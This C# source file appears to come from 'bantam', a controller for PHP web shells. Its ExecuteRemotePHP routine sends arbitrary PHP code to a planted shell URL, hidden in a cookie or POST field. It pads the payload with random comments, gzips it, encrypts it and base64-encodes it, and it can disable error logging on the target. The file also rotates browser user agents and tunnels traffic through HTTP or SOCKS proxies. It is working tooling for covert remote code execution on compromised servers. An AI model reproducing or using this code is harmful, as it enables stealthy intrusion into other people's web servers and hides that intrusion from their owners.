using System;
using System.Web;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net;
using SocksSharp;
using SocksSharp.Proxy;
using System.Text;
using System.IO;
using System.IO.Compression;

namespace bantam.Classes
{
    static class WebRequestHelper
    {
        /// <summary>
        /// Array of default / known useragents to choose from
        /// </summary>
        public static readonly Dictionary<int, string> commonUseragents = new Dictionary<int, string> {
            {0, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"},
            {1, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" },
            {2, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" },
            {3, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" },
            {4, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" },
            {5, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" },
            {6, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" },
            {7, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"},
            {8, "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36" },
            {9, "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36" },
            {10, "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01" },
            {11, "Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3" },
            {12, "Mozilla/5.0 (PlayStation 4 1.70) AppleWebKit/536.26 (KHTML, like Gecko)" }
        };

        /// <summary>
        /// Shared HttpClient resource to use for all requests
        /// </summary>
        /// 
        private static HttpClient client = new HttpClient(new HttpClientHandler {
            UseCookies = false,
        });

        /// <summary>
        /// Refreshes the Httpclient without using the proxy
        /// </summary>
        public static void ResetHttpClient()
        {
            client.CancelPendingRequests();
            client.Dispose();

            client = new HttpClient(new HttpClientHandler {
                UseCookies = false,
            });
        }

        /// <summary>
        /// Add's a HTTP proxy to the HTTPClient Handler and refreshes the shared HttpClient
        /// </summary>
        /// <param name="proxyUrl"></param>
        /// <param name="proxyPort"></param>
        public static void AddHttpProxy(string proxyUrl, string proxyPort)
        {
            client.CancelPendingRequests();
            client.Dispose();

            client = new HttpClient(new HttpClientHandler {
                UseProxy = true,
                UseCookies = false,
                Proxy = new WebProxy(proxyUrl + ":" + proxyPort, false),
            });
        }

        /// <summary>
        /// Add's a sock's proxy to the HTTPClient Handler using "SocksSharp" and refreshes the shared HttpClient
        /// </summary>
        /// <param name="proxyUrl"></param>
        /// <param name="proxyPort"></param>
        public static void AddSocksProxy(string proxyUrl, int proxyPort)
        {
            client.CancelPendingRequests();
            client.Dispose();

            var settings = new ProxySettings {
                Host = proxyUrl,
                Port = proxyPort
            };

            var proxyClientHandler = new ProxyClientHandler<Socks5>(settings);
            client = new HttpClient(proxyClientHandler);
        }

        /// <summary>
        /// GZip compresses a bytes stream
        /// </summary>
        /// <param name="input">Bytes stream to compress</param>
        /// <param name="removeHeader">Removes GZip header from stream, Gzip Stream contains a header that PHP's gzXXX functions do not have</param>
        /// <returns></returns>
        public static byte[] GzCompress(byte[] input, bool removeHeader = true)
        {
            using (var result = new MemoryStream()) {
                var lengthBytes = BitConverter.GetBytes(input.Length);
                result.Write(lengthBytes, 0, 4);

                using (var compressionStream = new GZipStream(result, CompressionMode.Compress)) {
                    compressionStream.Write(input, 0, input.Length);
                    compressionStream.Flush();
                }

                Byte[] compressedBytes = result.ToArray();

                if (removeHeader) {
                    int headerSize = 14;

                    Byte[] bytesWithoutHeader = new Byte[compressedBytes.Length - headerSize];
                    Buffer.BlockCopy(compressedBytes, headerSize, bytesWithoutHeader, 0, bytesWithoutHeader.Length);

                    return bytesWithoutHeader;
                } else {
                    return compressedBytes;
                }
            }
        }

        /// <summary>
        /// Creates a Task that executes a basic GET request (todo) - expand
        /// </summary>
        /// <param name="url">The URL to request</param>
        /// <returns>string : result</returns>
        public static async Task<string> GetRequest(string url)
        {
            try {
                HttpMethod method = HttpMethod.Get;

                var request = new HttpRequestMessage(method, url);
                request.Headers.TryAddWithoutValidation("User-Agent", Config.DefaultUserAgent);

                var response = await client.SendAsync(request);
                var responseString = await response.Content.ReadAsStringAsync();

                return responseString;
            }
            catch (System.Net.Http.HttpRequestException e) {
                LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
            }
            catch (Exception e) {
                LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
            }
            return string.Empty;
        }

        /// <summary>
        /// Main PHP execution routine, builds and executes php
        /// </summary>
        /// <param name="url"></param>
        /// <param name="phpCodeIn"></param>
        /// <param name="disableEncryption"></param>
        /// <returns></returns>
        public static async Task<ResponseObject> ExecuteRemotePHP(string url, string phpCodeIn, bool disableEncryption = false)
        {
            string ResponseEncryptionKey = string.Empty,
                   ResponseEncryptionIV = string.Empty,
                   requestEncryptionIV_VarName = string.Empty,
                   requestEncryptionIV = string.Empty;

            bool sendViaCookie = BantamMain.Shells[url].SendDataViaCookie;
            bool gzipRequestData = BantamMain.Shells[url].GzipRequestData;
            bool encryptResponse = BantamMain.Shells[url].ResponseEncryption;

            int ResponseEncryptionMode = BantamMain.Shells[url].ResponseEncryptionMode;

            bool encryptRequest = BantamMain.Shells[url].RequestEncryption;
            bool sendRequestEncryptionIV = BantamMain.Shells[url].SendRequestEncryptionIV;

            string requestArgsName = BantamMain.Shells[url].RequestArgName;
            string phpCode = PhpBuilder.RandomPHPComment() + phpCodeIn + PhpBuilder.RandomPHPComment();

            if (string.IsNullOrEmpty(phpCode)) {
                LogHelper.AddShellLog(url, "Attempted to execute empty/null code...", LogHelper.LOG_LEVEL.WARNING);
                return new ResponseObject(string.Empty, string.Empty, string.Empty);
            }

            try {
                if (encryptResponse && !disableEncryption) {
                    phpCode += PhpBuilder.EncryptPhpVariableAndEcho(ResponseEncryptionMode, ref ResponseEncryptionKey, ref ResponseEncryptionIV);
                }

                if (Config.DisableErrorLogs) {
                    phpCode = PhpBuilder.DisableErrorLogging() + phpCode;
                }

                if (Config.MaxExecutionTime) {
                    phpCode = PhpBuilder.MaxExecutionTime() + phpCode;
                }

                phpCode = Helper.MinifyCode(phpCode);

                byte[] phpCodeBytes = Encoding.UTF8.GetBytes(phpCode);

                if (gzipRequestData) {
                    phpCodeBytes = GzCompress(phpCodeBytes);
                }

                if (encryptRequest) {
                    string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;

                    if (sendRequestEncryptionIV) {
                        requestEncryptionIV = CryptoHelper.GetRandomEncryptionIV();
                        requestEncryptionIV_VarName = BantamMain.Shells[url].RequestEncryptionIVRequestVarName;

                        phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, requestEncryptionIV);
                    } else {
                        string encryptionIV = BantamMain.Shells[url].RequestEncryptionIV;

                        phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, encryptionIV);
                    }
                } else {
                    phpCode = Convert.ToBase64String(phpCodeBytes);
                }

                phpCode = HttpUtility.UrlEncode(phpCode);

                var request = new HttpRequestMessage();

                request.RequestUri = new Uri(url);
                request.Headers.TryAddWithoutValidation("User-Agent", Config.DefaultUserAgent);

                if (sendViaCookie) {
                    request.Method = HttpMethod.Get;
                    if (phpCode.Length > Config.MaxCookieSizeB) {
                        LogHelper.AddShellLog(url, "Attempted to execute a request larger than Max Cookie Size...", LogHelper.LOG_LEVEL.ERROR);
                        return new ResponseObject(string.Empty, string.Empty, string.Empty);
                    }

                    request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + phpCode);

                    if (encryptRequest && sendRequestEncryptionIV) {
                       request.Headers.TryAddWithoutValidation("Cookie,", requestEncryptionIV_VarName + "=" + HttpUtility.UrlEncode(requestEncryptionIV));
                    }
                } else {
                    request.Method = HttpMethod.Post;

                    string postArgs = string.Empty;

                    if (encryptRequest && sendRequestEncryptionIV) {
                        postArgs = string.Format(requestArgsName + "={0}&{1}={2}", phpCode, requestEncryptionIV_VarName, HttpUtility.UrlEncode(requestEncryptionIV));
                    } else {
                        postArgs = string.Format(requestArgsName + "={0}", phpCode);
                    }

                    int maxPostSizeBytes = (Config.MaxPostSizeKib * 1000);

                    if (postArgs.Length > maxPostSizeBytes) {
                        LogHelper.AddShellLog(url, "Attempted to execute request larger than Post Size Max...", LogHelper.LOG_LEVEL.ERROR);
                        return new ResponseObject(string.Empty, string.Empty, string.Empty);
                    }

                    request.Content = new StringContent(postArgs, Encoding.UTF8, "application/x-www-form-urlencoded");
                }

                using (HttpResponseMessage response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead)) {
                    var responseString = await response.Content.ReadAsStringAsync();
                    return new ResponseObject(responseString, ResponseEncryptionKey, ResponseEncryptionIV);
                }
            }
            catch (System.Net.Http.HttpRequestException e) {
                LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
            }
            catch (Exception e) {
                LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
            }
            return new ResponseObject(string.Empty, string.Empty, string.Empty);
        }
    }
}
